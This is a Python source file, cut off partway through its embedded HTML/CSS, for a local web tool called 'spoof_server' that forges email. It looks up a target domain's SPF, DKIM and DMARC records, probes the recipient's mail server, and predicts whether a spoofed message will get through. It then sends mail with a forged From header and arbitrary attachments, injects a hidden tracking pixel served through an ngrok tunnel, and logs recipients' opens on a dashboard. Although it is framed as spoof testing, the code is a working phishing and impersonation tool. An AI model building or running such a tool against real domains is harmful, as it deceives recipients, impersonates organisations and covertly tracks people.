#!/usr/bin/env python3
"""
spoof_server.py — Web UI for email spoof testing.

Features:
  - Preflight check: DNS lookups (MX, SPF, DKIM, DMARC) + SMTP probe
  - Full send: raw SMTP delivery with spoofed headers
  - Configurable From, To, Subject, Body (text + HTML), attachments

Usage:
    python3 spoof_server.py          # starts on http://localhost:8090
    python3 spoof_server.py 9000     # custom port

No dependencies beyond Python 3 standard library.
"""

import json
import smtplib
import socket
import subprocess
import sys
import os
import io
import base64
import traceback
import uuid
import threading
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime, timezone
from urllib.parse import parse_qs

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8090

# ── Ngrok detection ─────────────────────────────────────────────────
_ngrok_url = None  # cached public URL

def get_ngrok_url():
    """Check if ngrok is tunneling our port. Returns public URL or None."""
    global _ngrok_url
    try:
        import urllib.request
        resp = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=2)
        data = json.loads(resp.read())
        for t in data.get("tunnels", []):
            # Match tunnel forwarding to our port
            if f":{PORT}" in t.get("config", {}).get("addr", ""):
                _ngrok_url = t["public_url"]
                return _ngrok_url
            # Also check the forwarding URL pattern
            if t.get("proto") == "https" and str(PORT) in t.get("config", {}).get("addr", ""):
                _ngrok_url = t["public_url"]
                return _ngrok_url
    except:
        pass
    _ngrok_url = None
    return None

# ── Tracking pixel storage ──────────────────────────────────────────
# { track_id: { "from": ..., "to": ..., "subject": ..., "sent_at": ..., "opens": [ {"time": ..., "ip": ..., "ua": ...}, ... ] } }
_track_store = {}
_track_lock = threading.Lock()

# ── Event log for dashboard ────────────────────────────────────────
# List of { "type": "send"|"open", "time": ..., "track_id": ..., "from": ..., "to": ..., "subject": ..., "success": bool }
_event_log = []
_event_lock = threading.Lock()

# 1x1 transparent GIF (43 bytes)
TRACKING_GIF = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)


# ── DNS helpers ─────────────────────────────────────────────────────
def dig(record_type, domain):
    """Run dig and return raw output."""
    try:
        r = subprocess.run(
            ["dig", "+short", record_type, domain],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0:
            return r.stdout.strip()
    except:
        pass
    return ""

def get_mx(domain):
    """Resolve MX records, return (best_host, all_records_list, log_lines)."""
    lines = []
    raw = dig("MX", domain)
    if raw:
        records = []
        for line in raw.split("\n"):
            parts = line.strip().split()
            if len(parts) == 2:
                pri, host = int(parts[0]), parts[1].rstrip(".")
                records.append((pri, host))
        records.sort()
        if records:
            return records[0][1], records, []
    return None, [], [f"  Could not resolve MX for {domain}"]


# ── Preflight check ────────────────────────────────────────────────
def run_preflight(from_addr, to_addr, envelope_from):
    """DNS lookups + SMTP probe (no message sent). Returns structured results."""
    from_domain = from_addr.split("@")[-1].strip(">").strip()
    env_domain = envelope_from.split("@")[-1].strip(">").strip()
    to_domain = to_addr.split("@")[1].strip()

    result = {
        "from_domain": from_domain,
        "to_domain": to_domain,
        "env_domain": env_domain,
        "mx": {"records": [], "selected": None, "error": None},
        "spf": {"record": None, "policy": None, "verdict": None},
        "dkim": {"found": False, "record": None, "note": None},
        "dmarc": {"record": None, "policy": None, "verdict": None},
        "probe": {"port25": None, "ehlo": None, "starttls": None,
                  "mail_from": None, "rcpt_to": None, "prediction": None},
        "log": [],
    }
    log = result["log"]

    # ── MX lookup ──
    log.append("═══ DNS: MX Records ═══")
    log.append(f"  dig MX {to_domain}")
    best, records, errs = get_mx(to_domain)
    log.extend(errs)
    for pri, host in records:
        log.append(f"  priority {pri}: {host}")
    if best:
        result["mx"]["selected"] = best
        result["mx"]["records"] = [{"priority": p, "host": h} for p, h in records]
        log.append(f"  ✓ Will connect to: {best}")
    else:
        result["mx"]["error"] = f"No MX records found for {to_domain}"
        log.append(f"  ✗ No MX records found for {to_domain}")
        result["probe"]["prediction"] = "CANNOT_RESOLVE"
        return result

    # ── SPF lookup ──
    log.append("")
    log.append("═══ DNS: SPF Record ═══")
    log.append(f"  dig TXT {from_domain} (looking for v=spf1)")
    raw_txt = dig("TXT", from_domain)
    spf_rec = None
    for line in raw_txt.split("\n"):
        cleaned = line.strip().strip('"')
        if cleaned.startswith("v=spf1"):
            spf_rec = cleaned
            break
    if spf_rec:
        result["spf"]["record"] = spf_rec
        log.append(f"  Found: {spf_rec}")
        if "-all" in spf_rec:
            result["spf"]["policy"] = "hardfail (-all)"
            result["spf"]["verdict"] = "FAIL"
            log.append(f"  Policy: -all (hardfail) → unauthorized IPs get FAIL")
        elif "~all" in spf_rec:
            result["spf"]["policy"] = "softfail (~all)"
            result["spf"]["verdict"] = "SOFTFAIL"
            log.append(f"  Policy: ~all (softfail) → unauthorized IPs get SOFTFAIL")
            log.append(f"  ⚠ Softfail is weak — many servers still deliver")
        elif "?all" in spf_rec:
            result["spf"]["policy"] = "neutral (?all)"
            result["spf"]["verdict"] = "NEUTRAL"
            log.append(f"  Policy: ?all (neutral) → no opinion on unauthorized IPs")
        elif "+all" in spf_rec:
            result["spf"]["policy"] = "pass (+all)"
            result["spf"]["verdict"] = "PASS"
            log.append(f"  Policy: +all → ANYONE can send (wide open!)")
        else:
            result["spf"]["policy"] = "unknown"
            result["spf"]["verdict"] = "UNKNOWN"
            log.append(f"  Policy: could not determine 'all' mechanism")
        log.append(f"  Your IP is NOT in this SPF record → verdict: {result['spf']['verdict']}")
    else:
        result["spf"]["record"] = None
        result["spf"]["verdict"] = "NONE"
        log.append(f"  ✗ No SPF record found for {from_domain}")
        log.append(f"  Without SPF, there's no IP authorization at all")

    # ── DKIM lookup ──
    log.append("")
    log.append("═══ DNS: DKIM ═══")
    selectors = ["google", "default", "selector1", "selector2", "k1", "s1", "20230601"]
    dkim_found = False
    for sel in selectors:
        dkim_domain = f"{sel}._domainkey.{from_domain}"
        dkim_raw = dig("TXT", dkim_domain)
        if dkim_raw and "p=" in dkim_raw:
            result["dkim"]["found"] = True
            result["dkim"]["record"] = f"{sel}._domainkey.{from_domain}"
            dkim_found = True
            log.append(f"  ✓ Found DKIM key at: {dkim_domain}")
            log.append(f"  But attacker does NOT have the private key → DKIM will FAIL")
            break
    if not dkim_found:
        log.append(f"  Checked selectors: {', '.join(selectors)}")
        log.append(f"  ✗ No DKIM public key found (or using unknown selector)")
        result["dkim"]["note"] = "No DKIM key found in common selectors"
    log.append(f"  Attacker cannot sign → DKIM verdict: FAIL or NONE")

    # ── DMARC lookup ──
    log.append("")
    log.append("═══ DNS: DMARC Record ═══")
    dmarc_domain = f"_dmarc.{from_domain}"
    log.append(f"  dig TXT {dmarc_domain}")
    dmarc_raw = dig("TXT", dmarc_domain)
    dmarc_rec = None
    for line in dmarc_raw.split("\n"):
        cleaned = line.strip().strip('"')
        if cleaned.startswith("v=DMARC1"):
            dmarc_rec = cleaned
            break
    if dmarc_rec:
        result["dmarc"]["record"] = dmarc_rec
        log.append(f"  Found: {dmarc_rec}")
        if "p=reject" in dmarc_rec:
            result["dmarc"]["policy"] = "reject"
            result["dmarc"]["verdict"] = "BLOCKED"
            log.append(f"  Policy: p=reject → spoofed emails WILL be rejected ✓")
        elif "p=quarantine" in dmarc_rec:
            result["dmarc"]["policy"] = "quarantine"
            result["dmarc"]["verdict"] = "QUARANTINE"
            log.append(f"  Policy: p=quarantine → spoofed emails go to spam")
        elif "p=none" in dmarc_rec:
            result["dmarc"]["policy"] = "none"
            result["dmarc"]["verdict"] = "ALLOW"
            log.append(f"  Policy: p=none → spoofed emails are DELIVERED (no action)")
            log.append(f"  ⚠ This is the vulnerability — DMARC sees the failure but does nothing")
        else:
            result["dmarc"]["policy"] = "unknown"
            result["dmarc"]["verdict"] = "UNKNOWN"
    else:
        result["dmarc"]["record"] = None
        result["dmarc"]["policy"] = "missing"
        result["dmarc"]["verdict"] = "NO_POLICY"
        log.append(f"  ✗ No DMARC record found for {from_domain}")
        log.append(f"  Without DMARC, receivers make their own decision")

    # ── SMTP probe ──
    log.append("")
    log.append("═══ SMTP Probe (no message sent) ═══")
    mx_host = result["mx"]["selected"]
    log.append(f"  Connecting to {mx_host}:25 ...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        conn_result = sock.connect_ex((mx_host, 25))
        sock.close()

        if conn_result != 0:
            result["probe"]["port25"] = "BLOCKED"
            log.append(f"  ✗ Port 25 blocked (cannot connect)")
            result["probe"]["prediction"] = "PORT_BLOCKED"
            return result

        result["probe"]["port25"] = "OPEN"
        log.append(f"  ✓ Port 25 open")

        with smtplib.SMTP(mx_host, 25, timeout=15) as server:
            server.ehlo("probe.local")
            result["probe"]["ehlo"] = "OK"
            log.append(f"  ✓ EHLO accepted")

            if server.has_extn("STARTTLS"):
                server.starttls()
                server.ehlo("probe.local")
                result["probe"]["starttls"] = "OK"
                log.append(f"  ✓ STARTTLS established")
            else:
                result["probe"]["starttls"] = "NOT_SUPPORTED"
                log.append(f"  ⚠ STARTTLS not supported")

            code, resp = server.mail(envelope_from)
            if code == 250:
                result["probe"]["mail_from"] = "ACCEPTED"
                log.append(f"  ✓ MAIL FROM:<{envelope_from}> accepted (250)")
            else:
                result["probe"]["mail_from"] = f"REJECTED_{code}"
                detail = resp.decode(errors="replace")[:100]
                log.append(f"  ✗ MAIL FROM rejected: {code} {detail}")
                result["probe"]["prediction"] = "MAIL_FROM_REJECTED"
                server.rset()
                return result

            code, resp = server.rcpt(to_addr)
            detail = resp.decode(errors="replace")[:100]
            if code == 250:
                result["probe"]["rcpt_to"] = "ACCEPTED"
                log.append(f"  ✓ RCPT TO:<{to_addr}> accepted (250)")
            else:
                result["probe"]["rcpt_to"] = f"REJECTED_{code}"
                log.append(f"  ✗ RCPT TO rejected: {code} {detail}")
                result["probe"]["prediction"] = "RCPT_REJECTED"
                server.rset()
                return result

            # Don't send DATA — just RSET and quit
            server.rset()
            log.append(f"  ✓ RSET — connection closed cleanly (no email sent)")

    except Exception as e:
        result["probe"]["port25"] = result["probe"].get("port25", "ERROR")
        log.append(f"  ✗ Error: {type(e).__name__}: {str(e)[:80]}")
        result["probe"]["prediction"] = "ERROR"
        return result

    # ── Prediction ──
    log.append("")
    log.append("═══ Prediction ═══")

    dmarc_p = result["dmarc"]["policy"]
    spf_v = result["spf"]["verdict"]

    if dmarc_p == "reject":
        result["probe"]["prediction"] = "BLOCKED"
        log.append("  DMARC p=reject → server will REJECT the spoofed email")
        log.append("  ✓ Domain is protected")
    elif dmarc_p == "quarantine":
        result["probe"]["prediction"] = "SPAM"
        log.append("  DMARC p=quarantine → email will land in SPAM folder")
        log.append("  ⚠ Partial protection — attacker's email still arrives")
    elif dmarc_p == "none":
        result["probe"]["prediction"] = "DELIVERED"
        log.append("  DMARC p=none + SPF ~all → email will be DELIVERED")
        log.append("  ✗ Domain is VULNERABLE to spoofing on this provider")
        log.append("")
        log.append("  NOTE: Gmail/Outlook/Yahoo have extra protections that may")
        log.append("  still block this. Other providers will follow DMARC literally.")
    elif dmarc_p == "missing":
        result["probe"]["prediction"] = "LIKELY_DELIVERED"
        log.append("  No DMARC record → server decides on its own")
        log.append("  Most servers will deliver or spam-filter based on SPF alone")
    else:
        result["probe"]["prediction"] = "UNKNOWN"
        log.append("  Cannot determine outcome — test by sending")

    return result


# ── Send Email (unchanged logic) ───────────────────────────────────
def send_spoofed_email(from_addr, to_addr, envelope_from, subject, body_text, body_html, attachments, server_host="localhost"):
    log = []
    rcpt_domain = to_addr.split("@")[1]

    # Generate tracking pixel ID
    track_id = uuid.uuid4().hex[:12]
    # Prefer ngrok public URL so recipient's email client can reach us
    ngrok = get_ngrok_url()
    if ngrok:
        tracking_url = f"{ngrok}/track/{track_id}.gif"
    else:
        tracking_url = f"http://{server_host}:{PORT}/track/{track_id}.gif"
    tracking_pixel = f'<img src="{tracking_url}" width="1" height="1" style="display:none" alt="" />'

    log.append("═══ Step 1: DNS MX Lookup ═══")
    log.append(f"  Resolving MX for: {rcpt_domain}")
    best, records, errs = get_mx(rcpt_domain)
    log.extend(errs)
    for pri, host in records:
        log.append(f"  MX priority {pri}: {host}")
    if not best:
        log.append(f"  ✗ No MX records found")
        return {"success": False, "log": "\n".join(log)}
    mx_host = best
    log.append(f"  ✓ Selected: {mx_host}")

    log.append("")
    log.append("═══ Step 2: Building Message ═══")
    log.append(f"  From header:   {from_addr}  (spoofed)")
    log.append(f"  Envelope from: {envelope_from}")
    log.append(f"  To:            {to_addr}")
    log.append(f"  Subject:       {subject}")

    # Inject tracking pixel into HTML body
    if body_html:
        # Append pixel before closing </div>, </body>, or at end
        if '</body>' in body_html.lower():
            body_html = body_html.replace('</body>', f'{tracking_pixel}</body>').replace('</BODY>', f'{tracking_pixel}</BODY>')
        elif '</div>' in body_html:
            # Insert before the last </div>
            idx = body_html.rfind('</div>')
            body_html = body_html[:idx] + tracking_pixel + body_html[idx:]
        else:
            body_html += tracking_pixel
        log.append(f"  🔍 Tracking pixel injected: {track_id}")
        log.append(f"  🔗 Pixel URL: {tracking_url}")
    else:
        # Wrap plain text in minimal HTML to get a pixel
        body_html = f'<html><body><pre>{body_text}</pre>{tracking_pixel}</body></html>'
        log.append(f"  🔍 Tracking pixel injected (auto-wrapped HTML): {track_id}")
        log.append(f"  🔗 Pixel URL: {tracking_url}")

    has_attachments = len(attachments) > 0
    msg = MIMEMultipart("mixed")
    body_alt = MIMEMultipart("alternative")
    body_alt.attach(MIMEText(body_text, "plain"))
    body_alt.attach(MIMEText(body_html, "html"))
    msg.attach(body_alt)
    for fname, fdata in attachments:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(fdata)
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f'attachment; filename="{fname}"')
        msg.attach(part)
        log.append(f"  Attachment:    {fname} ({len(fdata)} bytes)")

    msg["From"] = from_addr
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg["Date"] = datetime.now(timezone.utc).strftime("%a, %d %b %Y %H:%M:%S +0000")
    msg["Message-ID"] = f"<spoof-{int(datetime.now().timestamp())}@{from_addr.split('@')[1]}>"

    log.append("")
    log.append("═══ Step 3: SMTP Connection ═══")
    log.append(f"  Connecting to {mx_host}:25 ...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        result = sock.connect_ex((mx_host, 25))
        sock.close()
        if result != 0:
            log.append(f"  ✗ Cannot connect to {mx_host}:25")
            return {"success": False, "log": "\n".join(log)}

        log.append(f"  ✓ Port 25 reachable")

        with smtplib.SMTP(mx_host, 25, timeout=30) as server:
            server.ehlo("security-test.local")
            log.append(f"  ✓ EHLO accepted by {mx_host}")
            if server.has_extn("STARTTLS"):
                server.starttls()
                server.ehlo("security-test.local")
                log.append("  ✓ STARTTLS encryption established")

            code, resp = server.mail(envelope_from)
            log.append(f"  MAIL FROM:<{envelope_from}> → {code}")
            if code != 250:
                log.append(f"  ✗ MAIL FROM rejected")
                return {"success": False, "log": "\n".join(log)}

            code, resp = server.rcpt(to_addr)
            log.append(f"  RCPT TO:<{to_addr}> → {code} {resp.decode(errors='replace')[:60]}")
            if code != 250:
                log.append(f"  ✗ Recipient rejected")
                return {"success": False, "log": "\n".join(log)}

            code, resp = server.data(msg.as_string().encode())
            detail = resp.decode(errors="replace")[:80]
            log.append(f"  DATA → {code} {detail}")

            if code == 250:
                log.append("")
                log.append("  ✅ EMAIL DELIVERED SUCCESSFULLY")
                log.append(f"  Check {to_addr}'s inbox or spam folder.")
                log.append(f"  🔍 Tracking pixel ID: {track_id}")
                # Store tracking info
                sent_time = datetime.now(timezone.utc).isoformat()
                with _track_lock:
                    _track_store[track_id] = {
                        "from": from_addr, "to": to_addr, "subject": subject,
                        "sent_at": sent_time,
                        "opens": []
                    }
                with _event_lock:
                    _event_log.append({
                        "type": "send", "time": sent_time, "track_id": track_id,
                        "from": from_addr, "to": to_addr, "subject": subject, "success": True
                    })
                return {"success": True, "log": "\n".join(log), "track_id": track_id}
            else:
                log.append(f"  ✗ Rejected at DATA stage: {code} {detail}")
                return {"success": False, "log": "\n".join(log)}

    except Exception as e:
        log.append(f"  ✗ Error: {type(e).__name__}: {e}")
        with _event_lock:
            _event_log.append({
                "type": "send", "time": datetime.now(timezone.utc).isoformat(),
                "track_id": track_id, "from": from_addr, "to": to_addr,
                "subject": subject, "success": False
            })
        return {"success": False, "log": "\n".join(log)}


# ── HTML UI ─────────────────────────────────────────────────────────
HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spoof</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
    background: #0f172a; color: #e2e8f0; min-height: 100vh;
    display: flex; flex-direction: column; align-items: center; padding: 1.2rem;
  }
  h1 { font-size: 1.3rem; margin-bottom: .2rem; }
  .subtitle { color: #94a3b8; font-size: .82rem; margin-bottom: 1rem; }
  .warning-banner {
    background: #7f1d1d33; border: 1px solid #991b1b55; border-radius: 8px;
    padding: .5rem .8rem; margin-bottom: .6rem; max-width: 1200px; width: 100%;
    font-size: .72rem; color: #fca5a5; text-align: center;
  }
  /* ── Top-level view tabs ── */
  .view-tabs {
    display: flex; gap: .3rem; margin-bottom: .8rem; max-width: 1200px; width: 100%;
  }
  .view-tab {
    padding: .45rem 1.2rem; border: 1px solid #334155; border-radius: 8px;
    background: transparent; color: #64748b; font-size: .78rem; font-weight: 600;
    cursor: pointer; transition: all .15s;
  }
  .view-tab:hover { border-color: #475569; color: #94a3b8; }
  .view-tab.active { background: #334155; color: #e2e8f0; border-color: #475569; }
  .view-panel { display: none; width: 100%; }
  .view-panel.active { display: block; }

  /* ── Password modal ── */
  .pw-overlay {
    position: fixed; inset: 0; background: #0f172aee; z-index: 100;
    display: flex; align-items: center; justify-content: center;
  }
  .pw-overlay.hidden { display: none; }
  .pw-box {
    background: #1e293b; border: 1px solid #334155; border-radius: 12px;
    padding: 1.5rem 2rem; text-align: center; max-width: 340px; width: 90%;
  }
  .pw-box h3 { font-size: .9rem; margin-bottom: .6rem; color: #e2e8f0; }
  .pw-box input {
    width: 100%; background: #0f172a; border: 1px solid #334155;
    border-radius: 6px; padding: .45rem .6rem; color: #e2e8f0;
    font-size: .8rem; text-align: center; margin-bottom: .5rem;
  }
  .pw-box input:focus { outline: none; border-color: #3b82f6; }
  .pw-box .pw-err { color: #f87171; font-size: .65rem; min-height: .9rem; }
  .pw-box button {
    padding: .4rem 1.5rem; border: none; border-radius: 6px;
    background: #3b82f6; color: white; font-size: .75rem; font-weight: 600;
    cursor: pointer; margin-top: .3rem;
  }
  .pw-box button:hover { background: #2563eb; }

  /* ── Dashboard styles ── */
  .dash-stats {
    display: flex; gap: 1.5rem; margin-bottom: 1.5rem;
    flex-wrap: wrap; justify-content: center;
  }
  .stat-card {
    background: #1e293b; border: 1px solid #334155; border-radius: 10px;
    padding: 1rem 1.5rem; min-width: 140px; text-align: center;
  }
  .stat-card .num {
    font-size: 2rem; font-weight: 700;
    font-family: 'SF Mono', Menlo, monospace;
  }
  .stat-card .label { font-size: .7rem; color: #64748b; text-transform: uppercase; letter-spacing: .05em; margin-top: .2rem; }
  .stat-sends .num { color: #60a5fa; }
  .stat-opens .num { color: #4ade80; }
  .stat-rate .num { color: #fbbf24; }
  .dash-feed { max-width: 700px; width: 100%; margin: 0 auto; }
  .dash-feed h2 {
    font-size: .75rem; color: #64748b; text-transform: uppercase;
    letter-spacing: .05em; margin-bottom: .8rem;
    padding-bottom: .4rem; border-bottom: 1px solid #1e293b;
  }
  .feed-empty {
    text-align: center; padding: 3rem 1rem; color: #475569; font-size: .85rem;
  }
  .dash-event {
    display: flex; align-items: flex-start; gap: .8rem;
    padding: .7rem .8rem; border-radius: 8px;
    margin-bottom: .4rem; transition: background .2s;
    animation: slideIn .3s ease-out;
  }
  .dash-event:hover { background: #1e293b; }
  @keyframes slideIn {
    from { opacity: 0; transform: translateY(-8px); }
    to { opacity: 1; transform: translateY(0); }
  }
  .ev-icon {
    width: 32px; height: 32px; border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; font-size: .85rem;
  }
  .ev-send .ev-icon { background: #1e3a5f; }
  .ev-open .ev-icon { background: #14532d; }
  .ev-body { flex: 1; min-width: 0; }
  .ev-title { font-size: .8rem; font-weight: 600; margin-bottom: .15rem; }
  .ev-send .ev-title { color: #93c5fd; }
  .ev-open .ev-title { color: #86efac; }
  .ev-detail {
    font-size: .7rem; color: #64748b;
    font-family: 'SF Mono', Menlo, monospace;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }
  .ev-time {
    font-size: .6rem; color: #475569; flex-shrink: 0;
    font-family: 'SF Mono', Menlo, monospace;
  }
  .pulse-dot {
    display: inline-block; width: 8px; height: 8px; border-radius: 50%;
    background: #4ade80; margin-right: 6px; vertical-align: middle;
    animation: pulse 1.5s infinite;
  }
  .ngrok-bar {
    display: flex; align-items: center; gap: .4rem; max-width: 1200px; width: 100%;
    padding: .3rem .8rem; border-radius: 6px;
    font-size: .6rem; font-family: 'SF Mono', Menlo, monospace;
    background: transparent; border: none; color: #475569;
    position: fixed; bottom: .5rem; left: 50%; transform: translateX(-50%);
    justify-content: center; opacity: .7;
  }
  .ngrok-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
  .ngrok-bar.connected { border-color: #4ade8055; background: #14532d22; }
  .ngrok-bar.connected .ngrok-dot { background: #4ade80; animation: pulse 1.5s infinite; }
  .ngrok-bar.disconnected { border-color: #f59e0b33; background: #78350f11; }
  .ngrok-bar.disconnected .ngrok-dot { background: #f59e0b; }
  .ngrok-bar a { color: #60a5fa; text-decoration: none; }

  .layout { display: grid; grid-template-columns: 320px 1fr; gap: 1rem; max-width: 1200px; width: 100%; }

  .panel {
    background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 1rem;
  }
  .panel h2 {
    font-size: .72rem; color: #94a3b8; text-transform: uppercase;
    letter-spacing: .05em; margin-bottom: .7rem;
    padding-bottom: .35rem; border-bottom: 1px solid #334155;
  }

  .field { margin-bottom: .55rem; }
  .field label {
    display: block; font-size: .6rem; font-weight: 600; color: #64748b;
    margin-bottom: .15rem; text-transform: uppercase; letter-spacing: .03em;
  }
  .field input, .field textarea {
    width: 100%; background: #0f172a; border: 1px solid #334155;
    border-radius: 5px; padding: .35rem .5rem; color: #e2e8f0;
    font-size: .75rem; font-family: 'SF Mono', Menlo, monospace;
  }
  .field input:focus, .field textarea:focus { outline: none; border-color: #3b82f6; }
  .field textarea { resize: vertical; min-height: 50px; }
  .field .hint { font-size: .55rem; color: #475569; margin-top: .1rem; }

  .toggle-row {
    display: flex; align-items: center; gap: .3rem;
    margin-bottom: .4rem; font-size: .68rem; color: #94a3b8;
  }
  .toggle-row input[type="checkbox"] { width: 13px; height: 13px; accent-color: #3b82f6; }

  .attachments-area {
    border: 1px dashed #334155; border-radius: 6px; padding: .45rem;
    text-align: center; cursor: pointer; font-size: .68rem; color: #64748b;
  }
  .attachments-area:hover { border-color: #3b82f6; }
  .attachments-area input { display: none; }
  .file-list { font-size: .65rem; color: #94a3b8; margin-top: .2rem; }
  .file-item {
    display: flex; justify-content: space-between; align-items: center;
    background: #0f172a; padding: .15rem .35rem; border-radius: 3px; margin-top: .15rem;
  }
  .file-item .remove { color: #ef4444; cursor: pointer; font-weight: bold; }

  .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: .4rem; margin-top: .5rem; }
  .btn {
    padding: .5rem; border: none; border-radius: 6px;
    font-size: .75rem; font-weight: 700; cursor: pointer; transition: all .2s;
  }
  .btn-probe { background: #1e40af; color: #93c5fd; }
  .btn-probe:hover { background: #1d4ed8; }
  .btn-send { background: linear-gradient(135deg, #dc2626, #991b1b); color: white; }
  .btn-send:hover { box-shadow: 0 3px 10px #dc262644; }
  .btn.sending { background: #475569; color: #94a3b8; cursor: not-allowed; }
  .btn.success { background: #16a34a; color: white; }

  .preview-frame { display: none; margin-top: .2rem; background: white; border-radius: 5px; overflow: hidden; }
  .preview-frame.show { display: block; }
  .preview-frame iframe { width: 100%; height: 180px; border: none; }

  /* ── Right Panel ── */
  .right-panel { display: flex; flex-direction: column; gap: .6rem; }

  /* ── Pipeline (stepper) ── */
  .pipeline {
    background: #1e293b; border: 1px solid #334155; border-radius: 10px;
    padding: 1rem 1.2rem .7rem;
  }
  .pipe-track {
    display: flex; align-items: flex-start; position: relative;
    padding: 0 8px;
  }
  /* The continuous background rail */
  .pipe-track::before {
    content: ''; position: absolute; top: 14px; left: 28px; right: 28px;
    height: 2px; background: #1e293b; z-index: 0;
  }
  .pipe-stage {
    flex: 1; display: flex; flex-direction: column; align-items: center;
    position: relative; z-index: 1;
  }
  .pipe-dot {
    width: 28px; height: 28px; border-radius: 50%;
    border: 2px solid #334155; background: #0f172a;
    display: flex; align-items: center; justify-content: center;
    transition: all .35s cubic-bezier(.4,0,.2,1);
    position: relative;
  }
  .pipe-dot svg { width: 14px; height: 14px; opacity: 0; transition: opacity .3s; }
  .pipe-dot .dot-num {
    font-size: .6rem; font-weight: 700; color: #475569;
    transition: opacity .3s;
    position: absolute;
  }
  .pipe-label {
    font-size: .55rem; font-weight: 600; color: #475569; margin-top: .35rem;
    text-transform: uppercase; letter-spacing: .04em; transition: color .35s;
    white-space: nowrap;
  }
  .pipe-detail {
    font-size: .5rem; color: #475569; margin-top: .1rem; transition: color .35s;
    font-family: 'SF Mono', Menlo, monospace; min-height: .65rem;
  }
  /* Segment fills between dots */
  .pipe-seg {
    position: absolute; top: 14px; height: 2px; z-index: 0;
    background: #334155; transition: background .5s cubic-bezier(.4,0,.2,1);
  }

  /* ── States ── */
  .pipe-stage.idle .pipe-dot { border-color: #334155; }
  .pipe-stage.idle .pipe-dot .dot-num { opacity: 1; }

  .pipe-stage.active .pipe-dot {
    border-color: #3b82f6; background: #172554;
    box-shadow: 0 0 0 4px #3b82f618;
    animation: stepPulse 2s cubic-bezier(.4,0,.6,1) infinite;
  }
  .pipe-stage.active .pipe-dot .dot-num { opacity: 0; }
  .pipe-stage.active .pipe-dot svg.spin-icon { opacity: 1; }
  .pipe-stage.active .pipe-label { color: #93c5fd; }
  .pipe-stage.active .pipe-detail { color: #60a5fa; }

  .pipe-stage.done .pipe-dot {
    border-color: #22c55e; background: #14532d;
    box-shadow: 0 0 0 3px #22c55e12;
  }
  .pipe-stage.done .pipe-dot .dot-num { opacity: 0; }
  .pipe-stage.done .pipe-dot svg.check-icon { opacity: 1; }
  .pipe-stage.done .pipe-label { color: #86efac; }
  .pipe-stage.done .pipe-detail { color: #4ade80; }

  .pipe-stage.fail .pipe-dot {
    border-color: #ef4444; background: #450a0a;
    box-shadow: 0 0 0 3px #ef444418;
  }
  .pipe-stage.fail .pipe-dot .dot-num { opacity: 0; }
  .pipe-stage.fail .pipe-dot svg.x-icon { opacity: 1; }
  .pipe-stage.fail .pipe-label { color: #fca5a5; }
  .pipe-stage.fail .pipe-detail { color: #f87171; }

  .pipe-stage.glow .pipe-dot {
    border-color: #22c55e; background: #14532d;
    box-shadow: 0 0 0 4px #22c55e20, 0 0 16px #22c55e28;
    animation: stepGlow 2.5s ease infinite;
  }
  .pipe-stage.glow .pipe-dot .dot-num { opacity: 0; }
  .pipe-stage.glow .pipe-dot svg.check-icon { opacity: 1; }
  .pipe-stage.glow .pipe-label { color: #4ade80; }
  .pipe-stage.glow .pipe-detail { color: #86efac; }

  .pipe-seg.done { background: #22c55e; box-shadow: 0 0 4px #22c55e33; }
  .pipe-seg.active { background: linear-gradient(90deg, #22c55e, #3b82f6); }
  .pipe-seg.fail { background: #ef4444; }

  @keyframes stepPulse {
    0%, 100% { box-shadow: 0 0 0 4px #3b82f618; }
    50% { box-shadow: 0 0 0 8px #3b82f610; }
  }
  @keyframes stepGlow {
    0%, 100% { box-shadow: 0 0 0 4px #22c55e20, 0 0 12px #22c55e18; }
    50% { box-shadow: 0 0 0 6px #22c55e28, 0 0 20px #22c55e30; }
  }
  @keyframes stepSpin {
    to { transform: rotate(360deg); }
  }
  @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:.4; } }

  /* ── Detail Tabs ── */
  .detail-panel {
    background: #1e293b; border: 1px solid #334155; border-radius: 10px;
    padding: .8rem 1rem; flex: 1; display: flex; flex-direction: column;
  }
  .tab-bar { display: flex; gap: .3rem; margin-bottom: .5rem; }
  .tab-btn {
    padding: .3rem .7rem; border: 1px solid #334155; border-radius: 6px;
    background: transparent; color: #64748b; font-size: .68rem; font-weight: 600;
    cursor: pointer; transition: all .15s;
  }
  .tab-btn:hover { border-color: #475569; color: #94a3b8; }
  .tab-btn.active { background: #334155; color: #e2e8f0; border-color: #475569; }
  .tab-content { display: none; flex: 1; }
  .tab-content.active { display: flex; flex-direction: column; }

  /* DNS cards */
  .pf-grid { display: grid; grid-template-columns: 1fr 1fr; gap: .4rem; margin-bottom: .4rem; }
  .pf-card {
    background: #0f172a; border: 1px solid #1e293b; border-radius: 6px; padding: .5rem;
  }
  .pf-card h3 {
    font-size: .62rem; text-transform: uppercase; letter-spacing: .04em;
    margin-bottom: .2rem; display: flex; justify-content: space-between; align-items: center;
  }
  .pf-card p { font-size: .65rem; color: #94a3b8; line-height: 1.3; word-break: break-all; }
  .pf-card code { font-size: .6rem; background: #1e293b; padding: .08rem .25rem; border-radius: 3px; color: #e2e8f0; }
  .pf-badge { font-size: .5rem; padding: .08rem .3rem; border-radius: 3px; font-weight: 700; }
